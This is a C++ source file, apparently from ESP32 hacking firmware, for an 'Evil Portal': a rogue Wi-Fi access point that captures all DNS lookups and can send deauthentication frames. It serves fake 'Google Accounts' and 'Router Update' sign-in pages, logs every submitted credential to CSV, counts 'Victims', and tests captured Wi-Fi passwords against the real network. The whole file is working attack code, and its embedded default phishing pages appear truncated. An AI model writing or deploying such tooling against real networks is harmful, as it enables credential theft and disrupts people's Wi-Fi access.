#include "evil_portal.h"
#include "core/display.h"
#include "core/sd_functions.h"
#include "core/mykeyboard.h"
#include "core/wifi_common.h"
#include "wifi_atks.h"
#include "esp_wifi.h"
#include "sniffer.h"

EvilPortal::EvilPortal(String tssid, uint8_t channel, bool deauth, bool verifyPwd) : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), webServer(80) {
    if (!setup()) return;

    beginAP();
    loop();
};

EvilPortal::~EvilPortal() {
    webServer.close();
    dnsServer.stop();

    delay(100);
    wifiDisconnect();
};

bool EvilPortal::setup() {
    bool returnToMain = false;
    options = {
        {"Custom Html", [=]() { loadCustomHtml(); }},
        {"Main Menu",   [&]() { returnToMain = true; }}
    };

    if (!_verifyPwd) {
        // Insert Options
        options.insert(options.begin(), {"Default", [=]() { loadDefaultHtml(); }});
    } else {
        options.insert(options.begin(), {"Default", [=]() { loadDefaultHtml_one(); }});
    }

    loopOptions(options);

    if (returnToMain) return false;

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    wsl_bypasser_send_raw_frame(&ap_record, _channel); //writes the buffer with the information

    if (apName == "")  {
        apName = keyboard("Free Wifi", 30, "Evil Portal SSID:");
    }

    options = {
        {"172.0.0.1",   [&]() { apGateway = IPAddress(172, 0, 0, 1);  }},
        {"192.168.4.1", [&]() { apGateway = IPAddress(192, 168, 4, 1); }},
    };

    loopOptions(options);

    Serial.println("Evil Portal output file: " + outputFile);
    return true;
}

void EvilPortal::beginAP() {
    drawMainBorderWithTitle("EVIL PORTAL");

    displayTextLine("Starting...");
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0));
    WiFi.softAP(apName, emptyString, _channel);
    wifiConnected = true;

    int tmp = millis();
    while (millis() - tmp < 3000) yield();

    setupRoutes();
    dnsServer.start(53, "*", WiFi.softAPIP());
    webServer.begin();
}

bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
    bool isConnected = false;

    if (_deauth) {
        temp_stop = true;
    }

    webServer.stop();
    wifiDisconnect();

    WiFi.mode(WIFI_MODE_STA);

    delay(80);

    WiFi.begin(Ssid, Password);

    int i = 1;
    while (WiFi.status() != WL_CONNECTED) {
        if (i > 15) {
          delay(500);
          break;
        }

        delay(500);
        i++;
    }

    if (WiFi.status() == WL_CONNECTED) {
        isConnected = true;
        delay(200);
    }
    if (_deauth) {
        temp_stop = false;
    }

    WiFi.mode(WIFI_MODE_AP);
    return isConnected;
}

void EvilPortal::setupRoutes() {
    webServer.on("/", [this]() { portalController(); });
    webServer.on("/post", [this]() { credsController(); });
    webServer.on("/creds", [this]() { webServer.send(200, "text/html", creds_GET()); });
    webServer.on("/ssid", [this]() { webServer.send(200, "text/html", ssid_GET()); });
    webServer.on("/postssid", [this]() {
        if (webServer.hasArg("ssid")) apName = webServer.arg("ssid").c_str();
        webServer.send(200, "text/html", ssid_POST());
        restartWiFi();
    });

    webServer.onNotFound([this]() {
        if (webServer.args() > 0) credsController();
        else portalController();
    });
}

void EvilPortal::restartWiFi(bool reset) {
    webServer.stop();
    wifiDisconnect();
    WiFi.softAP(apName);
    webServer.begin();

    if (reset) {
        resetCapturedCredentials();
    }
}

void EvilPortal::resetCapturedCredentials(void) {
    previousTotalCapturedCredentials = -1;
}

void EvilPortal::loop() {
    int lastDeauthTime = millis();
    bool isDeauthHeld = false;
    bool shouldRedraw = true;

    while (true) {
        if (shouldRedraw) {
            drawScreen(isDeauthHeld);
            shouldRedraw = false;
        }

        dnsServer.processNextRequest();
        webServer.handleClient();

        if ((!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) || (!temp_stop)) {
            send_raw_frame(deauth_frame, 26);  // Sends deauth frames if needed
            lastDeauthTime = millis();

            // Add handshake capturing logic
            setHandshakeSniffer();
        }

        if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
            shouldRedraw = true;
            previousTotalCapturedCredentials = totalCapturedCredentials - 1;
        }

        if (check(SelPress)) {
            debounceButtonPress();
            isDeauthHeld = !isDeauthHeld;
            shouldRedraw = true;
        }

        if (check(EscPress)) break;
    }
}

void EvilPortal::debounceButtonPress() {
    while (check(SelPress)) {
        delay(80);
    }
}

void EvilPortal::drawScreen(bool holdDeauth) {
    drawMainBorderWithTitle("EVIL PORTAL");

    String subtitle = "AP: " + apName.substring(0, 30);
    if (apName.length() > 30) subtitle += "...";
    printSubtitle(subtitle);

    String apIp = WiFi.softAPIP().toString();
    padprintln("");
    padprintln("-> " + apIp + "/creds");
    padprintln("-> " + apIp + "/ssid");

    padprintln("");

    if (!_verifyPwd) {
        padprint("Victims: ");
    } else {
        padprint("Attempt: ");
    }

    tft.setTextColor(TFT_RED);
    tft.println(String(totalCapturedCredentials));
    tft.setTextColor(bruceConfig.priColor);

    padprintln("");
    printLastCapturedCredential();

    if (_deauth) {
        printDeauthStatus(holdDeauth);
    }
}

void EvilPortal::printLastCapturedCredential() {
    int newlineIndex = lastCred.indexOf('\n');
    padprintln(lastCred.substring(0, newlineIndex));
    padprintln(lastCred.substring(newlineIndex + 1));
}

void EvilPortal::printDeauthStatus(bool holdDeauth) {
    if (holdDeauth) {
        printFootnote("Deauth OFF");
    } else {
        tft.setTextColor(TFT_RED);
        printFootnote("Deauth ON");
        tft.setTextColor(bruceConfig.priColor);
    }
}

void EvilPortal::loadCustomHtml() {
    getFsStorage(fsHtmlFile);

    htmlFileName = loopSD(*fsHtmlFile, true, "HTML");
    String fileBaseName = htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
    fileBaseName.toLowerCase();

    outputFile = fileBaseName + "_creds.csv";
    isDefaultHtml = false;

    File htmlFile = fsHtmlFile->open(htmlFileName, FILE_READ);
    if (htmlFile) {
        String firstLine = htmlFile.readStringUntil('\n');
        htmlFile.close();

        int apStart = firstLine.indexOf("<!-- AP=\"");
        if (apStart != -1) {
            int apEnd = firstLine.indexOf("\" -->", apStart);
            if (apEnd != -1) {
                apName = firstLine.substring(apStart + 9, apEnd);
            }
        }
    }
}

String EvilPortal::wifiLoadPage() {
    PROGMEM String wifiLoad = "<!DOCTYPE html><html><head> <meta charset='UTF-8'> <meta name='viewport' content='width=device-width, initial-scale=1.0'> </style></head><body> <div class='container'> <div class='logo-container'> <?xml version='1.0' standalone='no'?> <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'> </div> <div class=form-container> <div style='min-height: 150px'>" + body + "</div> </div> </div> </body> </html>";
    return wifiLoad;
}

void EvilPortal::loadDefaultHtml_one() {
    htmlPage = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Router Update</title><style>body {font-family: Arial, sans-serif;align-items: center;justify-content: center;background-color: #FFFFFF;}input[type='text'], input[type='password'] {width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px solid rgba(0,0,0,0.6);border-top-width: 0;border-right-width: 0;border-left-width: 0;border-radius: 0;}input[type='text']:focus, input[type='password']:focus {border-color: #0067b8;background-color: transparent;outline: none;}.container {margin: auto;padding: 20px;max-width: 700px;}.logo-container {text-align: center;margin-bottom: 30px;display: flex;justify-content: center;align-items: center;}.logo {width: 40px;height: 40px;fill: #FFC72C;margin-right: 100px;}.company-name {font-size: 42px;color: black;margin-left: 0px;}.form-container {background: #FFFFFF;border: 1px solid #CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);}.containertitle {display: flex;color: #202124;font-size: 24px;padding: 15px 0px 10px 0px;}.containersubtitle {color: #202124;font-size: 16px;padding: 0px 0px 30px 0px;}.containerbtn {display: flex;justify-content: end;padding: 30px 0px 25px 0px;} </style></head></html>";
    outputFile = "default_creds_1.csv";
    isDefaultHtml = true;
}

void EvilPortal::loadDefaultHtml() {
    htmlPage = "<!DOCTYPE html><html><head><title>Sign in: Google Accounts</title><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><style>a:hover{text-decoration: underline;}body{font-family: Arial, sans-serif;align-items: center;justify-content: center;background-color: #FFFFFF;}input[type='text'], input[type='password'] {width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px solid rgba(0,0,0,0.6);border-top-width: 0;border-right-width: 0;border-left-width: 0;border-radius: 0;}input[type='text']:focus, input[type='password']:focus {border-color: #0067b8;background-color: transparent;outline: none;}.container {margin: auto;padding: 20px;max-width: 700px;}.logo-container {text-align: center;margin-bottom: 30px;display: flex;justify-content: center;align-items: center;}.logo {width: 40px;height: 40px;fill: #FFC72C;margin-right: 100px;}.company-name {font-size: 42px;color: black;margin-left: 0px;}.form-container {background: #FFFFFF;border: 1px solid #CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);}.containertitle {display: flex;color: #202124;font-size: 24px;padding: 15px 0px 10px 0px;}.containersubtitle {color: #202124;font-size: 16px;padding: 0px 0px 30px 0px;}.containerbtn {display: flex;justify-content: end;padding: 30px 0px 25px 0px;} </style></head></html>";
    outputFile = "default_creds.csv";
    isDefaultHtml = true;
}

void EvilPortal::portalController() {
    if (isDefaultHtml) webServer.send(200, "text/html", htmlPage);
    else {
        File html = fsHtmlFile->open(htmlFileName);
        webServer.streamFile(html, "text/html");
        html.close();
    }
}

void EvilPortal::credsController() {
    String htmlResponse = "<li>";
    String passwordValue = "";
    String csvLine = "";
    String key;
    lastCred = "";

    for (int i = 0; i < webServer.args(); i++) {
        key = webServer.argName(i);

        if (key == "q" || key.startsWith("cup2") || key.startsWith("plain") || key == "P1" || key == "P2" || key == "P3" || key == "P4") {
            continue;
        }

        if (key == "password" && _verifyPwd) {
            passwordValue = webServer.arg(i);
        }

        htmlResponse += key + ": " + webServer.arg(i) + "<br>\n";
        if (i > 0) {
            csvLine += ",";
        }

        csvLine += key + ": " + webServer.arg(i);
        lastCred += key.substring(0, 3) + ": " + webServer.arg(i) + "\n";
    }

    htmlResponse += "</li>\n";

    if (_verifyPwd && passwordValue != "") {
        delay(500);
        bool isCorrect = verifyCreds(apName, passwordValue);
        if (isCorrect) {
            lastCred += "valid: true\n Stopping server...";
            saveToCSV(csvLine+", valid: true", true);
            printDeauthStatus(true);

            if (bruceConfig.getWifiPassword(apName) != "") {
                bruceConfig.addWifiCredential(apName, passwordValue);
            }
            delay(50);
            wifiDisconnect();
            wifiConnected = false;
        } else {
            lastCred += "valid: false";
            saveToCSV(csvLine+", valid: false", true);
            restartWiFi(false);
        }
    } else {
        saveToCSV(csvLine);
        webServer.send(200, "text/html", wifiLoadPage());
    }

    capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
    totalCapturedCredentials++;
}

String EvilPortal::getHtmlTemplate(String body) {
    PROGMEM String html =
        "<!DOCTYPE html>"
        "<html>"
        "<head>"
        "  <title>"+ apName + "</title>"
        "  <meta charset='UTF-8'>"
        "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
        "  <style>a:hover{text-decoration: underline;}body{font-family: Arial, sans-serif;align-items: center;justify-content: center;background-color: #FFFFFF;}input[type='text'], input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px solid #cccccc;border-radius: 4px;}.container{margin: auto;padding: 20px;max-width: 700px;}.logo-container{text-align: center;margin-bottom: 30px;display: flex;justify-content: center;align-items: center;}.logo{width: 40px;height: 40px;fill: #FFC72C;margin-right: 100px;}.company-name{font-size: 42px;color: black;margin-left: 0px;}.form-container{background: #FFFFFF;border: 1px solid #CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom: 20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: 4px;margin-bottom: 20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: #0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: #202124;font-size: 24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px 0px 30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style>"
        "</head>"
        "<body>"
        "  <div class='container'>"
        "    <div class='logo-container'>"
        "      <?xml version='1.0' standalone='no'?>"
        "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
        "    </div>"
        "    <div class=form-container>"
        "      <div style='min-height: 150px'>"
                + body +
        "      </div>"
        "    </div>"
        "  </div>"
        "</body>"
        "</html>";
    return html;
}


String EvilPortal::creds_GET() {
    return getHtmlTemplate("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
}


String EvilPortal::ssid_GET() {
    return getHtmlTemplate("<p>Set a new SSID for Evil Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apName+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
}


String EvilPortal::ssid_POST() {
    return getHtmlTemplate("Evil Portal shutting down and restarting with SSID <b>" + apName + "</b>. Please reconnect.");
}


void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
    FS *fs;
    if(!getFsStorage(fs)) {
        log_i("Error getting FS storage");
        return;
    }

    if (!fs->exists("/BruceEvilCreds")) fs->mkdir("/BruceEvilCreds");

    File file;

    if (!isAPname) {
        file = fs->open("/BruceEvilCreds/"+outputFile, FILE_APPEND);
    } else {
        file = fs->open("/BruceEvilCreds/"+apName+"_creds.csv", FILE_APPEND);
    }

    if (!file) {
        log_i("Error to open file");
        return;
    }
    file.println(csvLine);
    file.close();
    log_i("data saved");
}
